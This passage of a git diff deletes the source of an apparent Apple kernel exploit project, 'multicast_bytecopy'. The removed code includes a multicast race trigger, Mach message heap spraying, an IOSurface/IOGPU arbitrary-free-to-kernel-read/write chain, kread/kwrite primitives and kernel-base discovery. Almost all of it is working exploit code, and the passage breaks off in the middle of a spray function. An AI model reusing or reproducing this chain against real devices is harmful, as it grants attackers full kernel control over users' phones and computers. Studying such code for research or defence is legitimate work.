-int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
-{
-    uint8_t msg_buf[0x100];
-    int fildes[2];
-    pipe(fildes);
-    int read_pipe = fildes[0];
-    int write_pipe = fildes[1];
-    
-    // alloc this one before array of IOSurfaceClients becomes 0x4000
-    io_connect_t iosurface_connect_krw = IOSurfaceRoot_init();
-
-    // cause max size of arrays of IOSurfaceClients to become 0x4000
-    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x4000();
-    
-    // trigger arbitrary free in kheap default
-    port_destroy(arb_free_holder);
-    
-    // do refill in kheap default
-    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);
-    // NULL out array
-    IOSurfaceRoot_release_all(iosurface_connect_krw);
-
-    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
-    int kheap_default_idx = -1;
-    for (uint32_t i = 0;
-         (i < PORTS_COUNT) && port_has_msg(notif_port);
-         i++)
-    {
-        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
-       
-        port_destroy(kheap_default_ports[i]);
-
-        kheap_default_idx = i;
-    }
-    
-    // Note: don't add time sensitive code here, allocation at KHEAP_DEFAULT_MAPPABLE_LOC
-    // has been free'd and will be refilled below
-    
-    // printf("Allocation at KHEAP_DEFAULT_MAPPABLE_LOC has been free'd\n");
-    
-    if (kheap_default_idx >= PORTS_COUNT)
-    {
-        printf("kheap_default_idx >= PORTS_COUNT\n");
-        exit(1);
-    }
-    
-    // extra frees
-    for (int i = 0; i < extra_frees_for_device; ++i)
-    {
-        port_destroy(kheap_default_ports[(kheap_default_idx+1)+i]);
-    }
-    
-    // do refill
-    iogpu_connect = IOGPU_init();
-    // add entry
-    IOGPU_create_command_queue(iogpu_connect, KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10);
-    
-    printf("kheap_default_idx: %08X\n", kheap_default_idx);
-    
-    // refill in kheap data
-    port_destroy(kheap_data_ports[kheap_data_idx-1]);
-    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
-
-    kernel_rw_init(iosurface_connect_krw, 1, read_pipe, write_pipe);
-    
-    kwrite32(KHEAP_DEFAULT_MAPPABLE_LOC, 0xFEED);
-    uint32_t result = kread32(KHEAP_DEFAULT_MAPPABLE_LOC);
-    printf("Test kwrite32 and kread32: %08X (should be 0000FEED)\n", result);
-    if (result != 0xFEED)
-    {
-        printf("Failed! Reboot to try again (remember to only run once per boot)\n");
-        exit(1);
-    }
-    
-    printf("Get kernel base...\n");
-    
-    *kernel_base = kernel_base_from_holder(kheap_data_ports[kheap_data_idx-2], KHEAP_DATA_MAPPABLE_LOC - 0x8000);
-    printf("Got kernel base: %p\n", (void *)*kernel_base);
-    
-    return 0;
-}
-
-void exploitation_cleanup(void)
-{
-    uint64_t command_queue_loc = kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
-    uint64_t parent_loc = kread64(command_queue_loc + 0x488);
-    uint64_t namespace_loc = kread64(parent_loc + 0x88);
-    
-    // bump refs
-    kwrite32(command_queue_loc + 0x8, 10);
-    kwrite32(namespace_loc + 0x8, 10);
-    
-    IOServiceClose(iogpu_connect);
-}
-
-int exploit_get_krw_and_kernel_base(uint64_t *kernel_base)
-{
-    uint64_t _kernel_base = 0;
-    
-    // generic exploitation init
-    if (exploitation_init() != 0)
-    {
-        return 1;
-    }
-    
-    // trigger bug, get arbitrary free
-    mach_port_t arb_free_holder = get_arb_free_holder();
-    
-    // generic exploitation using arbitrary free
-    exploitation_get_krw_with_arb_free(arb_free_holder, &_kernel_base);
-    
-    // generic exploitation cleanup (kernel r/w still active)
-    //exploitation_cleanup();
-    
-    *kernel_base = _kernel_base;
-    
-    return 0;
-}
-
-int exploit_go(void)
-{
-    uint64_t kernel_base = 0;
-    
-    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
-    {
-        printf("Exploit failed!\n");
-        return 1;
-    }
-    
-    // test kernel r/w, read kernel base
-    uint32_t mh_magic = kread32(kernel_base);
-    if (mh_magic != 0xFEEDFACF)
-    {
-        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
-        return 1;
-    }
-    
-    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
-    
-    printf("Done\n");
-    
-    return 0;
-}
diff --git a/multicast_bytecopy/exploit/exploit.h b/multicast_bytecopy/exploit/exploit.h
deleted file mode 100644
index b38c75b..0000000
--- a/multicast_bytecopy/exploit/exploit.h
+++ /dev/null
@@ -1,9 +0,0 @@
-#ifndef __EXPLOIT_H__
-#define __EXPLOIT_H__
-
-#include <stdint.h>
-
-int exploit_get_krw_and_kernel_base(uint64_t *kernel_base);
-void exploitation_cleanup(void);
-
-#endif
diff --git a/multicast_bytecopy/exploit/iokit.h b/multicast_bytecopy/exploit/iokit.h
deleted file mode 100644
index 6a0e15d..0000000
--- a/multicast_bytecopy/exploit/iokit.h
+++ /dev/null
@@ -1,120 +0,0 @@
-// Credits: Siguza
-// https://github.com/Siguza/iokit-utils/blob/master/src/iokit.h
-#ifndef IOKIT_H
-#define IOKIT_H
-
-#include <stdint.h>
-#include <mach/mach.h>
-#include <CoreFoundation/CoreFoundation.h>
-
-typedef char io_name_t[128];
-typedef char io_string_t[512];
-typedef char io_struct_inband_t[4096];
-typedef mach_port_t io_object_t;
-typedef io_object_t io_registry_entry_t;
-typedef io_object_t io_service_t;
-typedef io_object_t io_connect_t;
-typedef io_object_t io_iterator_t;
-
-enum
-{
-    kIOCFSerializeToBinary          = 0x00000001U,
-};
-
-enum
-{
-    kIOClassNameOverrideNone        = 0x00000001U,
-};
-
-enum
-{
-    kIOMapAnywhere                  = 0x00000001U,
-};
-
-enum
-{
-    kIORegistryIterateRecursively   = 0x00000001U,
-    kIORegistryIterateParents       = 0x00000002U,
-};
-
-enum
-{
-    kOSSerializeDictionary          = 0x01000000U,
-    kOSSerializeArray               = 0x02000000U,
-    kOSSerializeSet                 = 0x03000000U,
-    kOSSerializeNumber              = 0x04000000U,
-    kOSSerializeSymbol              = 0x08000000U,
-    kOSSerializeString              = 0x09000000U,
-    kOSSerializeData                = 0x0a000000U,
-    kOSSerializeBoolean             = 0x0b000000U,
-    kOSSerializeObject              = 0x0c000000U,
-
-    kOSSerializeTypeMask            = 0x7F000000U,
-    kOSSerializeDataMask            = 0x00FFFFFFU,
-
-    kOSSerializeEndCollection       = 0x80000000U,
-
-    kOSSerializeMagic               = 0x000000d3U,
-};
-
-extern const mach_port_t kIOMasterPortDefault;
-
-CF_RETURNS_RETAINED CFDataRef IOCFSerialize(CFTypeRef object, CFOptionFlags options);
-CFTypeRef IOCFUnserializeWithSize(const char *buf, size_t len, CFAllocatorRef allocator, CFOptionFlags options, CFStringRef *err);
-
-kern_return_t IOObjectRetain(io_object_t object);
-kern_return_t IOObjectRelease(io_object_t object);
-boolean_t IOObjectConformsTo(io_object_t object, const io_name_t name);
-uint32_t IOObjectGetKernelRetainCount(io_object_t object);
-kern_return_t IOObjectGetClass(io_object_t object, io_name_t name);
-kern_return_t _IOObjectGetClass(io_object_t object, uint64_t options, io_name_t name);
-CFStringRef IOObjectCopyClass(io_object_t object);
-CFStringRef _IOObjectCopyClass(io_object_t object, uint64_t options);
-CFStringRef IOObjectCopySuperclassForClass(CFStringRef name);
-CFStringRef IOObjectCopyBundleIdentifierForClass(CFStringRef name);
-
-io_registry_entry_t IORegistryGetRootEntry(mach_port_t master);
-io_registry_entry_t IORegistryEntryFromPath(mach_port_t master, const io_string_t path);
-kern_return_t IORegistryEntryGetName(io_registry_entry_t entry, io_name_t name);
-kern_return_t IORegistryEntryGetRegistryEntryID(io_registry_entry_t entry, uint64_t *entryID);
-kern_return_t IORegistryEntryGetPath(io_registry_entry_t entry, const io_name_t plane, io_string_t path);
-kern_return_t IORegistryEntryGetProperty(io_registry_entry_t entry, const io_name_t name, io_struct_inband_t buffer, uint32_t *size);
-kern_return_t IORegistryEntryCreateCFProperties(io_registry_entry_t entry, CFMutableDictionaryRef *properties, CFAllocatorRef allocator, uint32_t options);
-CFTypeRef IORegistryEntryCreateCFProperty(io_registry_entry_t entry, CFStringRef key, CFAllocatorRef allocator, uint32_t options);
-kern_return_t IORegistryEntrySetCFProperties(io_registry_entry_t entry, CFTypeRef properties);
-
-kern_return_t IORegistryCreateIterator(mach_port_t master, const io_name_t plane, uint32_t options, io_iterator_t *it);
-kern_return_t IORegistryEntryCreateIterator(io_registry_entry_t entry, const io_name_t plane, uint32_t options, io_iterator_t *it);
-kern_return_t IORegistryEntryGetChildIterator(io_registry_entry_t entry, const io_name_t plane, io_iterator_t *it);
-kern_return_t IORegistryEntryGetParentIterator(io_registry_entry_t entry, const io_name_t plane, io_iterator_t *it);
-io_object_t IOIteratorNext(io_iterator_t it);
-boolean_t IOIteratorIsValid(io_iterator_t it);
-void IOIteratorReset(io_iterator_t it);
-
-CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
-CFMutableDictionaryRef IOServiceNameMatching(const char *name) CF_RETURNS_RETAINED;
-io_service_t IOServiceGetMatchingService(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
-kern_return_t IOServiceGetMatchingServices(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT, io_iterator_t *it);
-kern_return_t _IOServiceGetAuthorizationID(io_service_t service, uint64_t *authID);
-kern_return_t _IOServiceSetAuthorizationID(io_service_t service, uint64_t authID);
-kern_return_t IOServiceGetBusyStateAndTime(io_service_t service, uint64_t *state, uint32_t *busyState, uint64_t *busyTime);
-kern_return_t IOServiceOpen(io_service_t service, task_t task, uint32_t type, io_connect_t *client);
-kern_return_t IOServiceClose(io_connect_t client);
-kern_return_t IOCloseConnection(io_connect_t client);
-kern_return_t IOConnectAddRef(io_connect_t client);
-kern_return_t IOConnectRelease(io_connect_t client);
-kern_return_t IOConnectGetService(io_connect_t client, io_service_t *service);
-kern_return_t IOConnectAddClient(io_connect_t client, io_connect_t other);
-kern_return_t IOConnectSetNotificationPort(io_connect_t client, uint32_t type, mach_port_t port, uintptr_t ref);
-kern_return_t IOConnectMapMemory64(io_connect_t client, uint32_t type, task_t task, mach_vm_address_t *addr, mach_vm_size_t *size, uint32_t options);
-kern_return_t IOConnectUnmapMemory64(io_connect_t client, uint32_t type, task_t task, mach_vm_address_t addr);
-kern_return_t IOConnectSetCFProperties(io_connect_t client, CFTypeRef properties);
-kern_return_t IOConnectCallMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inStructCnt, uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outStructCnt);
-kern_return_t IOConnectCallScalarMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, uint64_t *out, uint32_t *outCnt);
-kern_return_t IOConnectCallStructMethod(io_connect_t client, uint32_t selector, const void *inStruct, size_t inStructCnt, void *outStruct, size_t *outStructCnt);
-kern_return_t IOConnectCallAsyncMethod(io_connect_t client, uint32_t selector, mach_port_t wake_port, uint64_t *ref, uint32_t refCnt, const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inStructCnt, uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outStructCnt);
-kern_return_t IOConnectCallAsyncScalarMethod(io_connect_t client, uint32_t selector, mach_port_t wake_port, uint64_t *ref, uint32_t refCnt, const uint64_t *in, uint32_t inCnt, uint64_t *out, uint32_t *outCnt);
-kern_return_t IOConnectCallAsyncStructMethod(io_connect_t client, uint32_t selector, mach_port_t wake_port, uint64_t *ref, uint32_t refCnt, const void *inStruct, size_t inStructCnt, void *outStruct, size_t *outStructCnt);
-kern_return_t IOConnectTrap6(io_connect_t client, uint32_t index, uintptr_t a, uintptr_t b, uintptr_t c, uintptr_t d, uintptr_t e, uintptr_t f);
-
-#endif
diff --git a/multicast_bytecopy/exploit/kernel_base.c b/multicast_bytecopy/exploit/kernel_base.c
deleted file mode 100644
index 5fe3165..0000000
--- a/multicast_bytecopy/exploit/kernel_base.c
+++ /dev/null
@@ -1,55 +0,0 @@
-#include "kernel_base.h"
-
-#include "kernel_rw.h"
-#include "port_utils.h"
-#include "spray.h"
-#include "xpaci.h" // ptrauth.h replacement
-
-#include <stdio.h>
-#include <stdint.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-
-#pragma clang diagnostic ignored "-Wdeprecated-declarations" // syscall
-
-uint64_t kernel_base_from_holder(mach_port_t holder, uint64_t holder_addr)
-{
-    uint64_t kernel_base = 0;
-    const int receive_size = 0x10000; // Doesn't really matter
-    const int data_kalloc_size = 0x50; // Doesn't really matter
-    uint8_t *buf = calloc(1, receive_size);
-    mach_port_t fileport = MACH_PORT_NULL;
-    
-    // read out port pointer
-    uint64_t port_addr = kread64(holder_addr + 8);
-    
-    // init fileport
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    syscall(SYS_fileport_makeport, sock, &fileport);
-    
-    // send new message contaning port
-    port_receive_msg(holder, buf, receive_size);
-    spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(sizeof(void *), &fileport, data_kalloc_size, holder);
-    
-    // read kernel text pointer fops
-    uint64_t kmsg = kread64(port_addr + 0x30);
-    uint64_t ikm_header = xpaci(kread64(kmsg + 0x18));
-    uint64_t oolp_array = kread64(ikm_header + 0x24);
-    uint64_t oolp = kread64(oolp_array);
-    uint64_t kobject = xpaci(kread64(oolp + 0x58));
-    uint64_t fops = kread64(kobject + 0x28);
-    
-    // find kernel base
-    uint64_t pos = (fops & ~0x3FFF);
-    do
-    {
-        pos -= 0x4000;
-    } while (kread32(pos) != 0xFEEDFACF);
-    kernel_base = pos;
-    
-    // cleanup
-    close(sock);
-    port_deallocate_n(&fileport, 1);
-    
-    return kernel_base;
-}
diff --git a/multicast_bytecopy/exploit/kernel_base.h b/multicast_bytecopy/exploit/kernel_base.h
deleted file mode 100644
index 6f50847..0000000
--- a/multicast_bytecopy/exploit/kernel_base.h
+++ /dev/null
@@ -1,9 +0,0 @@
-#ifndef __KERNEL_BASE_H__
-#define __KERNEL_BASE_H__
-
-#include <mach/mach.h>
-#include <stdint.h>
-
-uint64_t kernel_base_from_holder(mach_port_t holder, uint64_t holder_addr);
-
-#endif
diff --git a/multicast_bytecopy/exploit/kernel_rw.c b/multicast_bytecopy/exploit/kernel_rw.c
deleted file mode 100644
index d53d08d..0000000
--- a/multicast_bytecopy/exploit/kernel_rw.c
+++ /dev/null
@@ -1,126 +0,0 @@
-#include "kernel_rw.h"
-
-#include "IOSurfaceRoot.h"
-
-static io_connect_t _uc;
-static uint32_t _surf_id;
-static int _read_pipe;
-static int _write_pipe;
-static uint64_t _mapped_address;
-
-void kernel_rw_preinit(uint64_t kaddr, uint8_t *buf, size_t n)
-{
-    memset(buf, 0x07, n);
-
-    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
-    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
-    *(uint64_t *)(buf + 0x10 + 0xC0 + 0x18) = kaddr + 0x20 - 0xA0; // Write destination (+0xA0 added)
-    
-    _mapped_address = kaddr;
-}
-
-int kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe)
-{
-    _uc = uc;
-    _surf_id = surf_id;
-    _read_pipe = read_pipe;
-    _write_pipe = write_pipe;
-    
-    return 0;
-}
-
-uint32_t kread32(uint64_t kaddr)
-{
-    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
-    
-    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
-    
-    *(uint64_t *)(buf+ 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
-    *(uint64_t *)(buf+ 0x10 + 0xC0 ) = kaddr - 0x14; // Write destination (+0xA0 added)
-    
-    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
-    
-    return IOSurfaceRoot_get_surface_use_count(_uc, _surf_id);
-}
-
-uint64_t kread64(uint64_t kaddr)
-{
-    uint8_t b[8];
-    
-    *(uint32_t *)b = kread32(kaddr);
-    *(uint32_t *)(b + 4) = kread32(kaddr + 4);
-    
-    return *(uint64_t *)b;
-}
-
-uint64_t kread_ptr(uint64_t kaddr){
-    
-    uint64_t ret = kread64(kaddr);
-    return ret | 0xffffff8000000000;
-    
-}
-
-void kwrite32(uint64_t kaddr, uint32_t val)
-{
-    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
-    
-    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
-    
-    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
-    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
-    *(uint64_t *)(buf + 0x10 + 0xC0) = kaddr - 0xA0; // Write destination (+0xA0 added)
-    
-    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
-    
-    IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(_uc, _surf_id, val);
-}
-
-void kwrite64(uint64_t kaddr, uint64_t val)
-{
-    kwrite32(kaddr, (uint32_t)val);
-    kwrite32(kaddr + 4, (uint32_t)(val >> 32));
-}
-
-
-size_t kreadbuf(uint64_t where, void *p, size_t size){
-    size_t remainder = size % 4;
-    if (remainder == 0)
-        remainder = 4;
-    size_t tmpSz = size + (4 - remainder);
-    if (size == 0)
-        tmpSz = 0;
-
-    uint32_t *dstBuf = (uint32_t *)p;
-
-    size_t alignedSize = (size & ~0b11);
-    for (int i = 0; i < alignedSize; i+=4){
-        dstBuf[i/4] = kread32(where + i);
-    }
-    if (size > alignedSize) {
-        uint32_t r = kread32(where + alignedSize);
-        memcpy(((uint8_t*)p)+alignedSize, &r, size-alignedSize);
-    }
-    return size;
-}
-
-size_t kwritebuf(uint64_t where, const void *p, size_t size){
-    size_t remainder = size % 8;
-    if (remainder == 0)
-        remainder = 8;
-    size_t tmpSz = size + (8 - remainder);
-    if (size == 0)
-        tmpSz = 0;
-    
-    uint64_t *dstBuf = (uint64_t *)p;
-    size_t alignedSize = (size & ~0b111);
-
-    for (int i = 0; i < alignedSize; i+=8){
-        kwrite64(where + i, dstBuf[i/8]);
-    }
-    if (size > alignedSize) {
-        uint64_t val = kread64(where + alignedSize);
-        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
-        kwrite64(where + alignedSize, val);
-    }
-    return size;
-}
diff --git a/multicast_bytecopy/exploit/kernel_rw.h b/multicast_bytecopy/exploit/kernel_rw.h
deleted file mode 100644
index 8ddd7f9..0000000
--- a/multicast_bytecopy/exploit/kernel_rw.h
+++ /dev/null
@@ -1,20 +0,0 @@
-#ifndef __KERNEL_RW_H__
-#define __KERNEL_RW_H__
-
-#define KERNEL_RW_SIZE_FAKE_ARRAY 0x4000
-
-#include "iokit.h"
-
-void kernel_rw_preinit(uint64_t kaddr, uint8_t *buf, size_t n);
-int kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe);
-
-uint32_t kread32(uint64_t kaddr);
-uint64_t kread64(uint64_t kaddr);
-uint64_t kread_ptr(uint64_t kaddr);
-
-void kwrite32(uint64_t kaddr, uint32_t val);
-void kwrite64(uint64_t kaddr, uint64_t val);
-size_t kreadbuf(uint64_t where, void *p, size_t size);
-size_t kwritebuf(uint64_t where, const void *p, size_t size);
-#endif
-
diff --git a/multicast_bytecopy/exploit/mcast.c b/multicast_bytecopy/exploit/mcast.c
deleted file mode 100644
index 2357f09..0000000
--- a/multicast_bytecopy/exploit/mcast.c
+++ /dev/null
@@ -1,55 +0,0 @@
-#include "mcast.h"
-
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <sys/socket.h>
-#include <string.h>
-
-int mcast_race_sock;
-
-int mcast_join_group(int ip)
-{
-    struct group_req mreq = { 0 };
-    struct sockaddr_in6 sin6 = {0};
-    
-    mreq.gr_interface = 1;
-
-    sin6.sin6_len = sizeof(sin6);
-    sin6.sin6_family = AF_INET6;
-    sin6.sin6_port = 7878;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[3] = 0;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[2] = 0;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[1] = ip;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[0] = (htonl(0xFF000000));
-
-    memcpy(&mreq.gr_group, &sin6, sizeof(sin6));
-    
-    mreq.gr_interface = 1;
-    
-    return setsockopt(mcast_race_sock, IPPROTO_IPV6, MCAST_JOIN_GROUP, &mreq, sizeof(mreq));
-}
-
-void mcast_increase_race_reliability(void)
-{
-    struct group_req mreq = { 0 };
-    struct sockaddr_in6 sin6 = {0};
-    int s = socket(AF_INET6, SOCK_DGRAM, 0);
-    
-    mreq.gr_interface = 1;
-
-    sin6.sin6_len = sizeof(sin6);
-    sin6.sin6_family = AF_INET6;
-    sin6.sin6_port = 7878;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[3] = 0;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[2] = 0;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[1] = 0;
-    sin6.sin6_addr.__u6_addr.__u6_addr32[0] = (htonl(0xFF000000));
-
-    memcpy(&mreq.gr_group, &sin6, sizeof(sin6));
-
-    for (int i = 0; i < 3000; ++i)
-    {
-        ((struct sockaddr_in6 *)(&mreq.gr_group))->sin6_addr.__u6_addr.__u6_addr32[1] = i + (3000 * 3000);
-        setsockopt(s, IPPROTO_IPV6, MCAST_JOIN_GROUP, &mreq, sizeof(mreq));
-    }
-}
diff --git a/multicast_bytecopy/exploit/mcast.h b/multicast_bytecopy/exploit/mcast.h
deleted file mode 100644
index b87e837..0000000
--- a/multicast_bytecopy/exploit/mcast.h
+++ /dev/null
@@ -1,9 +0,0 @@
-#ifndef __MCAST_H__
-#define __MCAST_H__
-
-extern int mcast_race_sock;
-
-void mcast_increase_race_reliability(void);
-int mcast_join_group(int ip);
-
-#endif
diff --git a/multicast_bytecopy/exploit/necp.c b/multicast_bytecopy/exploit/necp.c
deleted file mode 100644
index 233b922..0000000
--- a/multicast_bytecopy/exploit/necp.c
+++ /dev/null
@@ -1,16 +0,0 @@
-#include "necp.h"
-
-#include <sys/syscall.h>
-#include <unistd.h>
-
-#pragma clang diagnostic ignored "-Wdeprecated-declarations"
-
-int necp_open(int flags)
-{
-    return syscall(SYS_necp_open, flags);
-}
-
-int necp_client_action(int necp_fd, uint32_t action, uint8_t *client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
-{
-    return syscall(SYS_necp_client_action, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
-}
diff --git a/multicast_bytecopy/exploit/necp.h b/multicast_bytecopy/exploit/necp.h
deleted file mode 100644
index b407756..0000000
--- a/multicast_bytecopy/exploit/necp.h
+++ /dev/null
@@ -1,10 +0,0 @@
-#ifndef __NECP_H__
-#define __NECP_H__
-
-#include <stdlib.h>
-#include <stdint.h>
-
-int necp_open(int flags);
-int necp_client_action(int necp_fd, uint32_t action, uint8_t *client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size);
-
-#endif
diff --git a/multicast_bytecopy/exploit/port_utils.c b/multicast_bytecopy/exploit/port_utils.c
deleted file mode 100644
index 570899a..0000000
--- a/multicast_bytecopy/exploit/port_utils.c
+++ /dev/null
@@ -1,116 +0,0 @@
-#include "port_utils.h"
-
-#include <mach/mach.h>
-#include <stdlib.h>
-
-#pragma clang diagnostic ignored "-Wdeprecated-declarations" // mach_port_destroy
-
-mach_port_t port_new(void)
-{
-    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
-    mach_port_t port;
-    
-    mach_port_construct(mach_task_self(), &options, 0, &port);
-    
-    return port;
-}
-
-void port_destroy(mach_port_t p)
-{
-    mach_port_destroy(mach_task_self(), p);
-}
-
-void port_deallocate(mach_port_t p)
-{
-    mach_port_deallocate(mach_task_self(), p);
-}
-
-void port_destroy_n(mach_port_t *p, unsigned int count)
-{
-    for (int i = 0; i < count; ++i)
-    {
-        mach_port_destroy(mach_task_self(), p[i]);
-        p[i] = 0;
-    }
-}
-
-void port_deallocate_n(mach_port_t *p, unsigned int count)
-{
-    for (int i = 0; i < count; ++i)
-    {
-        mach_port_deallocate(mach_task_self(), p[i]);
-    }
-}
-
-int port_has_msg(mach_port_t p)
-{
-    mach_msg_header_t msg = { 0 };
-
-    mach_msg(&msg, MACH_RCV_LARGE | MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x10, p, 0, 0);
-
-    return msg.msgh_size;
-}
-
-int port_peek_trailer_size(mach_port_t p)
-{
-    mach_port_seqno_t msg_seqno = 0;
-    mach_msg_size_t msg_size = 0;
-    mach_msg_id_t msg_id = 0;
-    mach_msg_trailer_t msg_trailer;
-    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
-    
-    mach_port_peek(mach_task_self(),
-                                  p,
-                                  MACH_RCV_TRAILER_NULL,
-                                  &msg_seqno,
-                                  &msg_size,
-                                  &msg_id,
-                                  (mach_msg_trailer_info_t)&msg_trailer,
-                                  &msg_trailer_size);
-
-    return msg_trailer.msgh_trailer_size;
-}
-
-void port_receive_msg(mach_port_t p, uint8_t *buf, unsigned int n)
-{
-    mach_msg((mach_msg_header_t *)buf,
-              MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,
-              0,
-              n,
-              p,
-              0,
-              0);
-}
-
-void port_receive_msg_n(mach_port_t *p, unsigned int count)
-{
-    uint8_t buf[0x1000];
-    
-    for (int i = 0; i < count; ++i)
-    {
-        port_receive_msg(p[i], buf, 8);
-    }
-}
-
-void port_receive_msg_all_n(mach_port_t *p, unsigned int count)
-{
-    uint8_t buf[0x1000];
-    
-    for (int i = 0; i < count; ++i)
-    {
-        do
-        {
-            port_receive_msg(p[i], buf, 8);
-        } while (port_has_msg(p[i]));
-    }
-}
-
-void port_receive_msg_and_deallocate_n(mach_port_t *p, unsigned int count)
-{
-    port_receive_msg_n(p, count);
-    port_deallocate_n(p, count);
-    for (int i = 0; i < count; ++i)
-    {
-        p[i] = MACH_PORT_NULL;
-    }
-}
diff --git a/multicast_bytecopy/exploit/port_utils.h b/multicast_bytecopy/exploit/port_utils.h
deleted file mode 100644
index 0740779..0000000
--- a/multicast_bytecopy/exploit/port_utils.h
+++ /dev/null
@@ -1,22 +0,0 @@
-#ifndef __PORT_UTILS_H__
-#define __PORT_UTILS_H__
-
-#include <mach/mach.h>
-
-mach_port_t port_new(void);
-
-void port_destroy(mach_port_t p);
-void port_deallocate(mach_port_t p);
-
-void port_destroy_n(mach_port_t *p, unsigned int count);
-void port_deallocate_n(mach_port_t *p, unsigned int count);
-
-int port_has_msg(mach_port_t p);
-int port_peek_trailer_size(mach_port_t p);
-
-void port_receive_msg(mach_port_t p, uint8_t *buf, unsigned int size);
-void port_receive_msg_n(mach_port_t *p, unsigned int count);
-
-void port_receive_msg_and_deallocate_n(mach_port_t *p, unsigned int count);
-
-#endif
diff --git a/multicast_bytecopy/exploit/spray.c b/multicast_bytecopy/exploit/spray.c
deleted file mode 100644
index a464562..0000000
--- a/multicast_bytecopy/exploit/spray.c
+++ /dev/null
@@ -1,214 +0,0 @@
-#include "spray.h"
-
-#include "necp.h"
-
-#include <mach/mach.h>
-#include <stdlib.h>
-
-mach_port_t *spray_data_kalloc_kmsg(uint8_t *data, unsigned int size, unsigned int count)
-{
-    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
-    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
-    mach_msg_header_t *msg = (mach_msg_header_t *)data;
-    
-    memset(msg, 0, sizeof(mach_msg_header_t));
-    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->msgh_size = size;
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
-    }
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        msg->msgh_remote_port = ports[i];
-        msg->msgh_id = i;
-        mach_msg_send(msg);
-    }
-    
-    return ports;
-}
-
-mach_port_t spray_data_kalloc_kmsg_single(uint8_t *data, unsigned int size)
-{
-    mach_port_t port = MACH_PORT_NULL;
-    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
-    mach_msg_header_t *msg = (mach_msg_header_t *)data;
-    
-    memset(msg, 0, sizeof(mach_msg_header_t));
-    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->msgh_size = size;
-    
-    mach_port_construct(mach_task_self(), &options, 0, &port);
-
-    msg->msgh_remote_port = port;
-    mach_msg_send(msg);
-    
-    return port;
-}
-
-void spray_data_kalloc_kmsg_on_ports(uint8_t *data, unsigned int size, unsigned int count, mach_port_t *ports)
-{
-    mach_msg_header_t *msg = (mach_msg_header_t *)data;
-    
-    memset(msg, 0, sizeof(mach_msg_header_t));
-    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->msgh_size = size;
-    //memcpy(msg + 1, data, size-sizeof(*msg));
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        msg->msgh_remote_port = ports[i];
-        msg->msgh_id = i;
-        mach_msg_send(msg);
-    }
-}
-
-
-mach_port_t *spray_data_kalloc_ool_descriptor(uint8_t *data, unsigned int size, unsigned int count)
-{
-    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
